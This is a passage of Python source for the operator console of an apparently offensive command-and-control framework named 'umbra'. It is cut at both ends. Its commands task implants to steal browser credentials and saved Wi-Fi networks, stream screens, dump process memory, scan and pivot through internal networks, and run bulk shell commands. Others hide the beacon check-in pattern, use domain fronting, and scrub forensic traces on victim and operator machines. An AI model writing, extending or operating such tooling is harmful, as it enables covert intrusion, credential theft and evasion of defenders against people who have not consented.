    clipw.add_argument("agent")
    clipw.add_argument("--action", default="status",
                       choices=["start", "stop", "poll", "status"])
    clipw.add_argument("--wait", action="store_true")
    clipw.add_argument("--timeout", type=float, default=120.0)

    stream = sub.add_parser("screen-stream",
                             help="the screen of an agent, frame by frame")
    stream.add_argument("agent")
    stream.add_argument("--frames", type=int, default=5)
    stream.add_argument("--fps", type=int, default=1)
    stream.add_argument("--wait", action="store_true")
    stream.add_argument("--timeout", type=float, default=120.0)

    wifi = sub.add_parser("wifi-profiles",
                          help="the saved networks of an agent")
    wifi.add_argument("agent")
    wifi.add_argument("--wait", action="store_true")
    wifi.add_argument("--timeout", type=float, default=120.0)

    brc = sub.add_parser("browser-creds",
                         help="the material of the browsers of an agent")
    brc.add_argument("agent")
    brc.add_argument("--raw", action="store_true",
                     help="put the secrets of the records on the wire")
    brc.add_argument("--wait", action="store_true")
    brc.add_argument("--timeout", type=float, default=120.0)

    av = sub.add_parser("av-survey", help="the security software of an agent")
    av.add_argument("agent")
    av.add_argument("--wait", action="store_true")
    av.add_argument("--timeout", type=float, default=120.0)

    usb = sub.add_parser("usb-history", help="the USB keys of an agent")
    usb.add_argument("agent")
    usb.add_argument("--wait", action="store_true")
    usb.add_argument("--timeout", type=float, default=120.0)

    mem = sub.add_parser("memory", help="the memory of a process of an agent")
    mem.add_argument("agent")
    mem.add_argument("pid")
    mem.add_argument("--wait", action="store_true")
    mem.add_argument("--timeout", type=float, default=120.0)

    # -- file triage and search -------------------------------------------
    triage = sub.add_parser("triage", help="triage a file on an agent")
    triage.add_argument("agent")
    triage.add_argument("path")
    triage.add_argument("--wait", action="store_true")
    triage.add_argument("--timeout", type=float, default=120.0)

    find = sub.add_parser("find", help="search for files on an agent")
    find.add_argument("agent")
    find.add_argument("name", nargs="?", default="", help="the name filter (a glob or a substring)")
    find.add_argument("--content", default="", help="also look for this text in the files")
    find.add_argument("--path", default=".", help="where to start the search")
    find.add_argument("--max", type=int, default=200)
    find.add_argument("--wait", action="store_true")
    find.add_argument("--timeout", type=float, default=300.0)

    netinfo = sub.add_parser("netinfo", help="the network configuration of an agent")
    netinfo.add_argument("agent")
    netinfo.add_argument("--wait", action="store_true")
    netinfo.add_argument("--timeout", type=float, default=120.0)

    # -- beacon policy ----------------------------------------------------
    policy = sub.add_parser("policy", help="push the cadence to one or many agents")
    policy.add_argument("agent", nargs="?", default="", help="agent id")
    policy.add_argument("--all", action="store_true",
                        help="every agent that matches the filters")
    policy.add_argument("--sleep", type=int, default=0, help="check-in interval in seconds")
    policy.add_argument("--jitter", type=int, default=0, help="jitter in percent")
    policy.add_argument("--obfuscate", dest="obfuscate", action="store_true", default=None,
                        help="hide the check-in pattern (the default)")
    policy.add_argument("--no-obfuscate", dest="obfuscate", action="store_false",
                        help="keep a fixed check-in interval")
    policy.add_argument("--state", default="", help="filter: online or offline")
    policy.add_argument("--tag", default="", help="filter: agents carrying this tag")

    tag = sub.add_parser("tag", help="label agents")
    tag.add_argument("agent", nargs="?", default="", help="agent id")
    tag.add_argument("labels", nargs="*", help="the tags to apply")
    tag.add_argument("--remove", action="store_true", help="remove the tags instead")
    tag.add_argument("--set", dest="replace", action="store_true",
                     help="replace every tag of the agent")
    tag.add_argument("--state", default="", help="filter: online or offline")
    tag.add_argument("--match", default="", help="filter: agents carrying this tag")

    # -- the server-side file store ---------------------------------------
    artifact = sub.add_parser("artifact", help="the team server's file store")
    artifact.add_argument("action", choices=["list", "put", "get", "remove", "push"],
                          help="what to do with the store")
    artifact.add_argument("name", nargs="?", default="", help="artifact name")
    artifact.add_argument("agent", nargs="?", default="", help="agent id (push)")
    artifact.add_argument("--file", default="", help="the local file (put, get)")
    artifact.add_argument("--path", default="", help="the path on the agent (push)")

    # -- network reach and the local environment ---------------------------
    scan = sub.add_parser("scan", help="scan a range of hosts for open ports")
    scan.add_argument("agent")
    scan.add_argument("target", help="an address or a CIDR block")
    scan.add_argument("--ports", default="22,80,443", help="the ports to try")
    scan.add_argument("--timeout-ms", dest="timeout_ms", type=int, default=800,
                      help="how long a single connect may take")
    scan.add_argument("--wait", action="store_true")
    scan.add_argument("--timeout", type=float, default=300.0)

    resolve = sub.add_parser("resolve", help="resolve a name on an agent")
    resolve.add_argument("agent")
    resolve.add_argument("host")
    resolve.add_argument("--port", type=int, default=0)
    resolve.add_argument("--wait", action="store_true")
    resolve.add_argument("--timeout", type=float, default=120.0)

    env = sub.add_parser("env", help="the environment of an agent")
    env.add_argument("agent")
    env.add_argument("--filter", default="",
                     help="only the variables whose name contains this")
    env.add_argument("--wait", action="store_true")
    env.add_argument("--timeout", type=float, default=120.0)

    touch = sub.add_parser("touch", help="create a file on an agent and stamp it")
    touch.add_argument("agent")
    touch.add_argument("path")
    touch.add_argument("--wait", action="store_true")
    touch.add_argument("--timeout", type=float, default=120.0)

    # -- burning an engagement ---------------------------------------------
    panic = sub.add_parser("panic", help="tell the beacons to exit and stop their work")
    panic.add_argument("agent", nargs="?", default="", help="agent id")
    panic.add_argument("--all", action="store_true",
                       help="every agent the server knows, sleeping ones included")
    panic.add_argument("--yes", action="store_true", help="do not ask")

    # -- local state ------------------------------------------------------
    dbcmd = sub.add_parser("db", help="the console's local state database (SQLite)")
    dbcmd.add_argument("action", choices=[
        "stats", "tasks", "results", "notes", "search", "note", "export",
        "findings", "artifacts", "screenshots", "creds"])
    dbcmd.add_argument("value", nargs="?", default="",
                       help="agent id, task id or search term (depends on the action)")
    dbcmd.add_argument("--limit", type=int, default=50)
    dbcmd.add_argument("--out", default="", help="output file for `db export`")
    dbcmd.add_argument("--agent", default="", help="agent id for `db note`")

    pincmd = sub.add_parser(
        "pin",
        help="print the pinned public key of a certificate (local, no server)")
    pincmd.add_argument("certificate", help="PEM file with the certificate")

    return p


def main(argv: Optional[List[str]] = None) -> int:
    args = build_parser().parse_args(argv)
    if args.cmd == "db":
        # The notebook is local: it works without a server or a token.
        return run_db_command(args)
    if args.cmd == "clean":
        # The hygiene of the machine of the operator is a local fact: it
        # works without a server or a token.
        return run_clean(None, None, args)
    if args.cmd == "pin":
        # The pin of a certificate is a local fact: it works without a
        # server and without a token.
        from . import tls as pinning
        try:
            print(pinning.spki_pin_of_pem(args.certificate))
        except (OSError, ValueError) as exc:
            print(f"cannot read the certificate: {exc}", file=sys.stderr)
            return 2
        return 0
    token = read_token(args)

    def on_event(ev: Dict[str, Any]) -> None:
        if args.watch:
            # Events arrive asynchronously; keep them off stdout so a piped
            # command's output is not corrupted.
            print_event(ev, stream=sys.stderr)

    client = OperatorClient(
        args.server,
        token,
        args.operator,
        timeout=args.timeout,
        on_event=on_event,
        tls=args.tls,
        tls_ca=args.tls_ca,
        tls_server_name=args.tls_server_name,
        tls_cert=args.tls_cert,
        tls_key=args.tls_key,
        tls_pin=args.tls_pin,
        otp=args.otp,
    )
    try:
        client.connect()
    except (OperatorError, crypto.AeadError, netio.StreamError, OSError) as exc:
        # A refused connection, a closed socket mid-handshake or a bad token all
        # land here; print one line instead of a traceback.
        print(f"connection failed: {exc}", file=sys.stderr)
        return 2

    # The local notebook: optional, and never fatal.
    store = open_state(args.db)
    console = Console(client, watch=args.watch, store=store)
    if store is not None:
        try:
            console.session = store.start_session(
                args.operator, args.server, client.session_id.hex())
        except Exception:  # noqa: BLE001 - the console works without a notebook
            console.session = 0
    try:
        if not args.quiet:
            # stderr, not stdout: `umbra tasks | jq` must receive pure data.
            print(f"connected to {args.server} as {args.operator} "
                  f"(session {client.session_id.hex()[:12]}…)",
                  file=sys.stderr)

        if args.cmd is None:
            # The interactive shell: the history, the completion and a
            # prompt that says what the console is looking at.
            print(BANNER)
            install_readline(console)
            console.refresh_status()
            while True:
                try:
                    prompt = f"umbra[{status_line(console)}]> "
                    line = read_command(prompt, console)
                except (EOFError, KeyboardInterrupt):
                    print()
                    break
                if not console.run_command(line):
                    break
                console.refresh_status()
            save_history(console)
            return 0

        if args.cmd == "agents":
            rows = client.agents(
                state=args.state, transport=args.transport, os=args.os,
                arch=args.arch, tag=args.tag, user=args.user,
            )
            emit(rows) if args.json else print_agents(rows)
        elif args.cmd == "whoami":
            data = client.whoami()
            emit(data) if args.json else print_whoami(data)
        elif args.cmd == "chat":
            if args.message:
                text = " ".join(args.message).strip()
                to = args.to
                # `chat @bob hello` is the same as `chat --to bob hello`.
                if not to and text.startswith("@"):
                    head, _, rest = text[1:].partition(" ")
                    if head and rest.strip():
                        to, text = head, rest.strip()
                data = client.say(text, to)
                if args.json:
                    emit({"sent": text, **({"to": to} if to else {})})
                else:
                    print(f"sent: {text}" + (f" -> {to}" if to else ""))
            elif args.operators:
                # Who is in the channel: the consoles, their focus and how
                # long they have been quiet.
                rows = client.chat_operators()
                if args.json:
                    emit(rows)
                else:
                    print(table(
                        ["OPERATOR", "ROLE", "FOCUS", "IDLE", "STATE"],
                        [[r.get("name", "?"), r.get("role", "?"),
                          r.get("focus") or "-", f"{r.get('idle_sec', 0)}s",
                          "stale" if r.get("stale") else
                          ("silent" if r.get("silent") else "here")]
                         for r in rows]))
            else:
                messages = client.chat_history(args.limit)
                emit(messages) if args.json else print_chat(messages)
        elif args.cmd == "assign":
            # Handing a task to a colleague: the colleague sees it in their
            # inbox, and everybody sees who is expected to work on it.
            data = client.assign_task(args.task_id, args.to)
            if args.json:
                emit(data)
            else:
                target = data.get("assigned_to", "")
                print(f"task {args.task_id} -> {target}" if target
                      else f"task {args.task_id} is unassigned")
        elif args.cmd == "inbox":
            rows = client.inbox(args.operator)
            if args.json:
                emit(rows)
            else:
                print_tasks(rows)
        elif args.cmd == "handover":
            payload = client.team_handover()
            notes: List[Dict[str, Any]] = []
            if console.store is not None:
                try:
                    notes = console.store.notes(limit=50)
                except Exception:  # noqa: BLE001 - the notebook is optional
                    notes = []
            document = render_handover(payload, notes)
            if args.out:
                try:
                    with open(args.out, "w", encoding="utf-8") as handle:
                        handle.write(document)
                except OSError as exc:
                    print(f"cannot write {args.out}: {exc}", file=sys.stderr)
                    return 2
                print(f"wrote {args.out}")
            else:
                print(document)
        elif args.cmd == "schedule":
            if args.action == "list":
                rows = client.schedules()
                emit(rows) if args.json else print_schedules(rows)
            elif args.action == "add":
                if not args.target or not args.kind:
                    print("usage: umbra schedule add <agent> <kind> [--every N] [--args JSON]",
                          file=sys.stderr)
                    return 2
                try:
                    task_args = json.loads(args.args)
                except json.JSONDecodeError as exc:
                    print(f"invalid --args json: {exc}", file=sys.stderr)
                    return 2
                if not isinstance(task_args, dict):
                    print("--args must be a JSON object", file=sys.stderr)
                    return 2
                # The key=value form is for the arguments an operator types
                # every time; the JSON form is for the rest.
                for pair in args.arg:
                    if "=" not in pair:
                        print(f"invalid --arg {pair!r}: use key=value", file=sys.stderr)
                        return 2
                    key, _, value = pair.partition("=")
                    task_args.setdefault(key.strip(), value.strip())
                data = client.add_schedule(args.target, args.kind, args.every, task_args)
                emit(data) if args.json else print(
                    f"scheduled {data['schedule_id']} ({args.kind} every {args.every}s on {args.target})"
                )
            else:
                if not args.target:
                    print("usage: umbra schedule rm <schedule-id>", file=sys.stderr)
                    return 2
                client.remove_schedule(args.target)
                emit({"schedule_id": args.target, "removed": True}) if args.json else print(
                    f"removed {args.target}"
                )
        elif args.cmd == "focus":
            data = client.focus(args.agent)
            if args.json:
                emit(data)
            elif args.agent:
                print(f"focus: {args.agent}")
            else:
                print("focus cleared")
        elif args.cmd == "claim":
            data = client.claim(args.task_id)
            emit(data) if args.json else print(f"claimed {args.task_id} ({data.get('state', '?')})")
        elif args.cmd == "release":
            data = client.release(args.task_id)
            if args.json:
                emit(data)
            else:
                print(f"released {args.task_id}" if not data.get("claimed_by")
                      else f"still claimed by {data['claimed_by']}")
        elif args.cmd == "operators":
            rows = client.operators()
            emit(rows) if args.json else print_operators(rows)
        elif args.cmd == "quiet":
            answer = client.quiet(args.state == "on", args.until)
            if args.json:
                emit(answer)
            else:
                if answer.get("quiet"):
                    until = answer.get("until")
                    when = time.strftime("%H:%M:%S", time.localtime(int(until))) if until else "manually"
                    print(f"the server is quiet until {when}")
                else:
                    print("the server is loud again")
        elif args.cmd == "queue":
            answer = client.queue()
            if args.json:
                emit(answer)
            else:
                print_queue(answer)
        elif args.cmd == "keys":
            if getattr(args, "keys_cmd", "") != "rotate":
                print("umbra keys rotate --target agent")
                return
            answer = client.rotate_keys(args.target,
                                        read_secret(args.rotate_psk,
                                                    args.rotate_psk_file))
            if args.json:
                emit(answer)
            else:
                print(f"the new agent key is {answer.get('psk', '')}")
                print(f"the previous key works for {answer.get('overlap', 0)} seconds")
                print("give the new key to the beacons")
        elif args.cmd == "tokens":
            if getattr(args, "tokens_cmd", "") == "rotate":
                answer = client.rotate_token(args.operator, args.role,
                                             list(args.scope or []),
                                             args.expires,
                                             read_secret(args.rotate_token,
                                                         args.rotate_token_file))
                if args.json:
                    emit(answer)
                else:
                    print(f"the new token of {args.operator} is {answer.get('token', '')}")
                    if answer.get("scopes"):
                        print("the scopes: " + ", ".join(answer.get("scopes") or []))
            else:
                rows = client.tokens()
                emit(rows) if args.json else print_tokens(rows)
        elif args.cmd == "priority":
            answer = client.set_priority(args.task_id, args.priority)
            if args.json:
                emit(answer)
            else:
                print(f"task {answer.get('task_id', '')} has priority "
                      f"{answer.get('priority', 0)}")
        elif args.cmd == "test-event":
            answer = client.test_event(args.kind)
            if args.json:
                emit(answer)
            else:
                print(f"event {answer.get('seq', '?')} queued")
        elif args.cmd == "stats":
            emit(client.stats())
        elif args.cmd == "audit":
            if args.verify:
                payload = client.audit_verify()
                if args.json:
                    emit(payload)
                else:
                    print_audit_verification(payload)
            else:
                payload = client.audit(args.limit)
                if args.json:
                    emit(payload)
                else:
                    print_audit(payload)
        elif args.cmd == "hunt":
            return run_hunt(client, console, args)
        elif args.cmd == "health":
            payload = client.health_fleet()
            if args.json:
                emit(payload)
            else:
                print_health_fleet(payload)
        elif args.cmd == "case":
            return run_case(client, console, args)
        elif args.cmd == "approval":
            return run_approval(client, console, args)
        elif args.cmd == "canary":
            return run_canary(client, console, args)
        elif args.cmd == "dossier":
            return run_dossier(client, console, args)
        elif args.cmd == "note":
            return run_note(client, console, args)
        elif args.cmd == "hook":
            return run_hook(client, console, args)
        elif args.cmd == "attack":
            return run_attack(client, console, args)
        elif args.cmd == "search":
            return run_search(client, console, args)
        elif args.cmd == "rhythm":
            return run_rhythm(client, console, args)
        elif args.cmd == "silence":
            return run_silence(client, console, args)
        elif args.cmd == "baseline":
            return run_baseline(client, console, args)
        elif args.cmd == "otp":
            return run_otp(client, console, args)
        elif args.cmd == "info":
            emit(client.agent_info(args.agent))
        elif args.cmd == "run":
            command = " ".join(args.command).strip()
            filters = parse_filter(args.filter)
            if args.group:
                filters["tag"] = args.group
            bulk_agents = [a.strip() for a in args.agents.split(",") if a.strip()]
            if filters or bulk_agents:
                # The bulk path: one kind of task, many agents, one cap on
                # how many answers are waited for at the same time.
                if not args.kind_flag:
                    print("a bulk run needs --kind", file=sys.stderr)
                    return 2
                try:
                    task_args = json.loads(args.args)
                except json.JSONDecodeError as exc:
                    print(f"invalid --args json: {exc}", file=sys.stderr)
                    return 2
                rows = client.submit_bulk(args.kind_flag, task_args,
                                          agents=bulk_agents or None, **filters)
                for row in rows:
                    console.note_task(str(row.get("task_id", "")),
                                      str(row.get("agent_id", "")),
                                      args.kind_flag, task_args)
                results = run_bulk(client, console, args.kind_flag, task_args, rows,
                                   cap=args.cap, timeout=args.timeout, wait=args.wait)
                if args.json:
                    emit({"tasks": results, "count": len(results)})
                else:
                    print(f"queued {len(results)} task(s) of kind {args.kind_flag}")
                    print(render_bulk_table(results))
                return 0
            if not args.agent:
                print("no agent given", file=sys.stderr)
                return 2
            if not command:
                print("no command given", file=sys.stderr)
                return 2
            task_id = client.submit(args.agent, "shell", {"cmd": command})
            console.note_task(task_id, args.agent, "shell", {"cmd": command})
            if args.json and not args.wait:
                emit({"task_id": task_id, "agent": args.agent, "kind": "shell"})
            else:
                print(f"queued {task_id}")
            if args.wait:
                result = client.wait_for_result(task_id, timeout=args.timeout)
                console.note_result(task_id, result)
                emit(result) if args.json else print_task_result(result)
        elif args.cmd == "task":
            try:
                task_args = json.loads(args.args)
            except json.JSONDecodeError as exc:
                print(f"invalid --args json: {exc}", file=sys.stderr)
                return 2
            kind = args.kind_flag or args.kind
            if not kind:
                print("no task kind given", file=sys.stderr)
                return 2
            bulk_agents = [a.strip() for a in args.agents.split(",") if a.strip()]
            bulk_filter = parse_filter(args.filter)
            if bulk_agents or bulk_filter:
                # The bulk path: one task, many agents.
                rows = client.submit_bulk(kind, task_args,
                                          agents=bulk_agents or None, **bulk_filter)
                for row in rows:
                    console.note_task(str(row.get("task_id", "")), str(row.get("agent_id", "")),
                                      kind, task_args)
                if args.json:
                    emit({"tasks": rows, "count": len(rows)})
                else:
                    print(f"queued {len(rows)} task(s) of kind {kind}")
                    for row in rows:
                        print(f"  {row.get('agent_id', '?')} -> {row.get('task_id', '?')}")
                return 0
            if not args.agent:
                print("no agent given", file=sys.stderr)
                return 2
            task_id = client.submit(args.agent, kind, task_args,
                                    deadline=args.deadline,
                                    timeout=args.task_timeout)
            console.note_task(task_id, args.agent, kind, task_args)
            if args.json and not args.wait:
                emit({"task_id": task_id, "agent": args.agent, "kind": kind})
            else:
                print(f"queued {task_id}")
            if args.wait:
                result = client.wait_for_result(task_id, timeout=args.timeout)
                console.note_result(task_id, result)
                emit(result) if args.json else print_task_result(result)
        elif args.cmd in ("download", "upload"):
            chunk = args.chunk or CHUNK_MAX
            if chunk < 1 or chunk > CHUNK_MAX:
                print(f"--chunk must be between 1 and {CHUNK_MAX}", file=sys.stderr)
                return 2
            bar = None if args.json else _progress_printer()

            def note(done: int, total: int) -> None:
                if bar is not None:
                    bar(done, total)

            if args.cmd == "download":
                info = client.download_file(
                    args.agent, args.remote, args.local,
                    timeout=args.timeout, chunk=chunk, progress=note,
                )
            else:
                info = client.upload_file(
                    args.agent, args.local, args.remote,
                    timeout=args.timeout, chunk=chunk, progress=note,
                )
            if bar is not None:
                bar(info["bytes"], info["bytes"], final=True)
            if args.cmd == "download":
                # The artefact is kept in the notebook: the file on the disk
                # of the operator and the record of what it was.
                console.note_artifact(
                    os.path.basename(info.get("path", "") or args.local),
                    args.agent, str(info.get("sha256", "")),
                    args.remote, int(info.get("bytes", 0) or 0))
            emit(info) if args.json else print(
                f"{args.cmd} {info['path']} {info['bytes']} bytes in {info['chunks']} chunk(s)"
                f" sha256={info['sha256'][:16]}…"
            )
        elif args.cmd == "tasks":
            rows = client.tasks(args.agent, args.limit, kind=args.kind,
                                state=args.state, trace=args.trace)
            emit(rows) if args.json else print_tasks(rows)
        elif args.cmd == "result":
            task = client.task(args.task_id)
            # Collecting the output is part of the history: it belongs in the
            # notebook as much as the submission does.
            console.note_result(args.task_id, task)
            if args.out:
                # The output of a task is often a file: a digest list, a
                # dump, a log.  Writing it to a file keeps it whole.
                out = task.get("out", b"")
                if isinstance(out, str):
                    out = out.encode()
                with open(args.out, "wb") as fh:
                    fh.write(out)
                if args.json:
                    emit({"task_id": args.task_id, "file": args.out,
                          "bytes": len(out)})
                else:
                    print(f"wrote {args.out} ({len(out)} bytes)")
                return 0 if task.get("state") == "done" and not task.get("code") else 1
            if args.json:
                emit(task)
                # A failed task must fail the shell too, so scripts can branch
                # on the exit status instead of parsing output.
                return 0 if task.get("state") == "done" and not task.get("code") else 1
            print_task_result(task)
        elif args.cmd == "retry":
            res = client.retry(args.task_id)
            if args.json:
                print(json.dumps(res, indent=2, sort_keys=True))
            else:
                console.print(f"[green]queued[/] {res.get('task_id')} "
                              f"(the task {args.task_id} is retried)")
        elif args.cmd == "cancel":
            client.cancel(args.task_id)
            if args.json:
                emit({"task_id": args.task_id, "state": "cancelled"})
            else:
                print(f"cancelled {args.task_id}")
        elif args.cmd == "wipe":
            # The end of an engagement.  The implants are not touched, so
            # the operator is asked twice.
            if not args.yes:
                print("this clears the agents, the tasks and the schedules "
                      "of the server.")
                print("the implants keep running; remove them first.")
                answer = input("type 'wipe' to continue: ").strip()
                if answer != "wipe":
                    print("nothing was changed")
                    return 0
            res = client.wipe()
            if args.json:
                emit(res)
            else:
                print(f"removed {res.get('agents', 0)} agents, "
                      f"{res.get('tasks', 0)} tasks and "
                      f"{res.get('schedules', 0)} schedules")
        elif args.cmd == "survey":
            # What the engagement left on the host.  It changes nothing.
            run_forensics_and_wait(client, console, args.agent, "forensics.survey",
                                    {}, args.wait, args.timeout, args.json)
        elif args.cmd == "forensics":
            # The surface of the host, as an analyst would find it.
            run_forensics_and_wait(client, console, args.agent, "forensics.report",
                                    {}, args.wait, args.timeout, args.json)
        elif args.cmd == "scrub":
            # The removal of the traces.  The families are the ones the
            # operator names; the report says which family was touched.
            families = [f.strip() for f in args.what.split(",") if f.strip()]
            run_forensics_and_wait(client, console, args.agent, "forensics.wipe",
                                    {"what": families, "dry_run": bool(args.dry_run)},
                                    args.wait, args.timeout, args.json)
        elif args.cmd == "verify":
            # What is left after the wipe.
            run_forensics_and_wait(client, console, args.agent, "forensics.verify",
                                    {}, args.wait, args.timeout, args.json)
        elif args.cmd == "journal":
            # The timeline of the engagement on the host.  The journal is
            # a trace of its own, so it is off until the operator says so.
            state = "on" if args.on else ("off" if args.off else "")
            run_forensics_and_wait(client, console, args.agent, "forensics.timeline",
                                    {"journal": state}, args.wait, args.timeout, args.json)
        elif args.cmd == "vanish":
            # The implant leaves the host.  There is no way back, so the
            # operator is asked twice.
            if not args.yes:
                print("this removes the implant from the host: its state, its journal "
                      "and its binary.")
                print("the machine keeps everything that is not the implant.")
                answer = input("type 'vanish' to continue: ").strip()
                if answer != "vanish":
                    print("nothing was changed")
                    return 0
            run_forensics_and_wait(client, console, args.agent, "forensics.self",
                                    {}, args.wait, args.timeout, args.json)
        elif args.cmd == "decommission":
            # The end of the engagement on the host: the watchers stop, the
            # persistence goes, the traces are wiped and the implant leaves
            # the machine.  There is no way back, so the operator is asked
            # twice.
            if not args.yes:
                print("this ends the engagement on the host: the watchers stop, the "
                      "persistence is taken away,")
                print("the traces are wiped and the implant leaves the machine.")
                answer = input("type 'decommission' to continue: ").strip()
                if answer != "decommission":
                    print("nothing was changed")
                    return 0
            run_forensics_and_wait(client, console, args.agent, "forensics.decommission",
                                    {}, args.wait, args.timeout, args.json)
        elif args.cmd == "clean":
            # The machine of the operator is a host too: the notebook of
            # the console and the commands that were typed are traces of
            # the engagement.
            run_clean(client, console, args)
        elif args.cmd == "deadman":
            # The dead man's switch: the implant ends itself when the
            # operator stops checking in.
            run_forensics_and_wait(client, console, args.agent, "forensics.deadman",
                                    {"minutes": int(args.minutes)},
                                    args.wait, args.timeout, args.json)
        elif args.cmd == "cleanup":
            # The end of an engagement on many hosts: the survey of each
            # one, the wipe of the traces and the verification.
            if not args.yes:
                print("this wipes the traces of every host that matches the filter.")
                print("the implants keep running: remove them with vanish or")
                print("decommission when the engagement is over.")
                answer = input("type 'cleanup' to continue: ").strip()
                if answer != "cleanup":
                    print("nothing was changed")
                    return 0
            run_cleanup(client, console, args)
        elif args.cmd == "panic":
            # The end of an engagement on the target side.  The beacons are
            # told to exit and the server stops feeding them, so the
            # operator is asked twice.
            if not args.yes:
                print("this tells the selected beacons to exit and stops "
                      "the server from queueing any more work for them.")
                print("the implants that are asleep get the command on "
                      "their next check-in.")
                try:
                    answer = input("type 'panic' to continue: ").strip()
                except (EOFError, KeyboardInterrupt):
                    print()
                    print("nothing was changed")
                    return 0
                if answer != "panic":
                    print("nothing was changed")
                    return 0
            res = client.panic([args.agent] if args.agent else None, args.all)
            if args.json:
                emit(res)
            else:
                print(f"panicked {res.get('count', 0)} agents")
                for agent_id in res.get("panicked", []):
                    print(f"  {agent_id}")
        elif args.cmd == "artifact":
            if args.action == "list":
                rows = client.artifact_list()
                if args.json:
                    emit(rows)
                else:
                    print_artifacts(rows)
            elif args.action == "put":
                if not args.file:
                    print("artifact put needs --file", file=sys.stderr)
                    return 2
                # Without a name the file keeps its own.
                name = args.name or os.path.basename(args.file)
                info = client.artifact_upload(name, args.file)
                if args.json:
                    emit(info)
                else:
                    print(f"stored {info.get('name')} "
                          f"({info.get('size')} bytes, "
                          f"sha256 {info.get('sha256')})")
            elif args.action == "get":
                if not args.file:
                    print("artifact get needs --file", file=sys.stderr)
                    return 2
                info = client.artifact_download(args.name, args.file)
                if args.json:
                    emit(info)
                else:
                    print(f"wrote {info.get('bytes')} bytes to "
                          f"{info.get('local')}")
            elif args.action == "remove":
                info = client.artifact_remove(args.name)
                if args.json:
                    emit(info)
                else:
                    print(f"removed {args.name}")
            elif args.action == "push":
                info = client.artifact_push(args.name, args.agent, args.path)
                if args.json:
                    emit(info)
                else:
                    print(f"pushing {args.name} to {args.agent} "
                          f"({info.get('stages')} chunks, "
                          f"{info.get('size')} bytes)")
        elif args.cmd == "scan":
            run_task_and_wait(client, console, args.agent, "scan", {
                "host": args.target,
                "ports": args.ports,
                "timeout_ms": args.timeout_ms,
            }, args.wait, args.timeout, args.json)
        elif args.cmd == "resolve":
            run_task_and_wait(client, console, args.agent, "resolve", {
                "host": args.host,
                "port": args.port,
            }, args.wait, args.timeout, args.json)
        elif args.cmd == "env":
            run_task_and_wait(client, console, args.agent, "env", {
                "filter": args.filter,
            }, args.wait, args.timeout, args.json)
        elif args.cmd == "touch":
            run_task_and_wait(client, console, args.agent, "touch", {
                "path": args.path,
            }, args.wait, args.timeout, args.json)
        elif args.cmd == "sessions":
            rows = client.sessions()
            if args.json:
                emit(rows)
            else:
                print_sessions(rows)
        elif args.cmd == "events":
            res = client.events(args.after, args.limit)
            rows = res.get("events") or []
            if args.kind:
                rows = [e for e in rows if e.get("kind") == args.kind]
            if args.agent:
                rows = [e for e in rows if e.get("agent_id") == args.agent]
            if args.json:
                emit(rows)
            else:
                print_events(rows)
        elif args.cmd == "watch":
            return watch_events(client, args.limit, as_json=args.json)
        elif args.cmd == "sleep":
            client.set_sleep(args.agent, args.seconds, args.jitter)
            if args.json:
                emit({"agent": args.agent, "sleep": args.seconds, "jitter": args.jitter})
            else:
                print("beacon policy updated")
        elif args.cmd == "kill":
            res = client.rpc("agents.kill", {"id": args.agent})
            print("kill task queued" if res.ok else f"error: {res.error}")
        elif args.cmd == "pivot":
            if args.action == "list":
                tunnels = client.pivot_list()
                sessions = client.pivot_sessions()
                topology = client.pivot_topology()
                if args.json:
                    emit({"tunnels": tunnels, "sessions": sessions,
                          "topology": topology})
                else:
                    print_pivots(tunnels, sessions, topology)
            elif args.action == "open":
                if not args.target:
                    print("usage: umbra pivot open <agent> [--mode socks|forward] "
                          "[--host H --port P] [--listen ADDR] [--dns remote|local] "
                          "[--loopback] [--claim NAME] [--through AGENT ...] "
                          "[--pipe] [--pipe-name NAME]",
                          file=sys.stderr)
                    return 2
                data = client.pivot_open(
                    args.target,
                    mode=args.mode,
                    host=args.host,
                    port=args.port,
                    listen=args.listen,
                    dns=args.dns,
                    loopback=args.loopback,
                    claim=args.claim,
                    through=args.through[0] if args.through else "",
                    user=args.user,
                    password=args.password,
                    path=list(args.through),
                    pipe=args.pipe,
                    pipe_name=args.pipe_name,
                )
                if args.json:
                    emit(data)
                else:
                    print(f"pivot {data.get('stream')} open on {data.get('listen')} "
                          f"via {data.get('agent_id')} ({data.get('mode')})")
                    if data.get("claim"):
                        print(f"  claim {data.get('claim')}")
            elif args.action == "claims":
                claims = client.pivot_claims()
                if args.json:
                    emit({"claims": claims})
                elif not claims:
                    print("no claim is held")
                else:
                    for claim in claims:
                        print(f"{claim.get('claim')}: "
                              f"{', '.join(claim.get('tunnels') or [])}")
            elif args.action == "release":
                if not args.target:
                    print("usage: umbra pivot release <claim>", file=sys.stderr)
                    return 2
                closed = client.pivot_release(args.target)
                if args.json:
                    emit({"claim": args.target, "closed": closed})
                else:
                    print(f"released {args.target}: {len(closed)} pivots torn down")
            else:
                if not args.target:
                    print("usage: umbra pivot close <tunnel-id>", file=sys.stderr)
                    return 2
                client.pivot_close(args.target)
                if args.json:
                    emit({"stream": args.target, "closed": True})
                else:
                    print(f"closed {args.target}")
        elif args.cmd == "transport":
            if args.action == "list":
                routes = client.transport_list()
                if args.json:
                    emit({"routes": routes})
                else:
                    rows = [
                        [
                            r.get("agent", "?"),
                            r.get("primary", "?"),
                            ",".join(r.get("fallback") or []) or "-",
                            r.get("front", "") or "-",
                            "yes" if r.get("inspect") else "no",
                        ]
                        for r in routes
                    ]
                    print(_table(
                        ["AGENT", "PRIMARY", "FALLBACK", "FRONT", "INSPECT"], rows))
            elif args.action == "get":
                if not args.target:
                    print("usage: umbra transport get <agent>", file=sys.stderr)
                    return 2
                route = client.transport_get(args.target)
                if args.json:
                    emit(route)
                else:
                    print(f"{route.get('agent')} speaks {route.get('primary')}"
                          f" (fallback: {', '.join(route.get('fallback') or []) or '-'})"
                          + (f", front {route.get('front')}" if route.get("front") else ""))
            else:
                if not args.target or not args.primary:
                    print("usage: umbra transport set <agent> --primary <transport> "
                          "[--fallback tcp,ws] [--front domain] [--inspect]",
                          file=sys.stderr)
                    return 2
                fallback = [f.strip() for f in args.fallback.split(",") if f.strip()]
                route = client.transport_set(
                    args.target,
                    primary=args.primary,
                    fallback=fallback,
                    front=args.front,
                    inspect=args.inspect,
                    http_path=args.http_path,
                    ws_path=args.ws_path,
                )
                if args.json:
                    emit(route)
                else:
                    print(f"{route.get('agent')} now speaks {route.get('primary')}"
                          f" (fallback: {', '.join(route.get('fallback') or []) or '-'})")
        elif args.cmd == "vpn":
            if args.action == "status":
                status = client.vpn_status()
                emit(status) if args.json else print_vpn_status(status)
            elif args.action == "peers":
                peers = client.vpn_peers()
                emit(peers) if args.json else print_vpn_peers(peers)
            elif args.action == "routes":
